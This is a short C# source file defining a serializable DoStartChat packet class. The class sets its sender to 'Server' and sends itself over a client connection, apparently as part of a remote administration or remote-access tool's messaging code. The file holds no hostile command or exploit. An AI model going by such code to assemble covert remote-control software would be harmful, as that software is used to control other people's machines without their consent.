using System;
using xClient.Core.Networking;

namespace xClient.Core.Packets.ServerPackets
{
    [Serializable]
    public class DoStartChat : IPacket
    {
        string Sender { get; set; }

        public DoStartChat()
        {
            Sender = "Server";
        }
        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}
